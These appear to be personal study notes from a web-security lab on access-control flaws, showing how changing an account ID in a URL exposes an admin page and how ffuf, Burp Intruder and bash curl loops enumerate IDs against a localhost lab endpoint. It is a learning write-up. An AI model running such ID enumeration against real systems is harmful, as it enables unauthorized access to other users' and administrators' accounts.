
Access control vulnerability
we can request a resource with an object id

eg:
userID
productID 

in lab

change acountID and we find we can also access admins page

![[Pasted image 20230712145157.png]]

since we have a query(?) parameter in URL, need to put the URL inside quotes

```sh
ffuf -w num.txt -u 'http://localhost/labs/e0x02.php?account=FUZZ' -fs 849
```

-fs:filtersize(remove specified size response)
remove incorrect parameter

![[Pasted image 20230712145635.png]]

```sh
ffuf -w num.txt -u 'http://localhost/labs/e0x02.php?account=FUZZ' -fs 849 | grep FUZZ
```

now try to identify all the accounts that are admin

1)Use burpsuite intruder and filter out the response

![[Pasted image 20230712150944.png]]

2)Writing a script that filters response using curl

```sh
#!/bin/bash

fuzz=(1002 1001 1012 1004 1008 1003 1013 1011 1015 1016 1005  1000  1010 1006 1017 1018 1019 1014 1007 1009)

#all the values that are user

for i in "${fuzz[@]}"
do

curl -s http://localhost/labs/e0x02.php?account=${i} |grep admin && echo $i

done
```


OR

```sh
#!/bin/bash


fuzz=()

readarray -t fuzz < num.txt

for i in "${fuzz[@]}"
do

curl -s http://localhost/labs/e0x02.php?account=${i} |grep admin && echo $i

done

```

`readarray` will create an array where each element of the array is a line in the input.

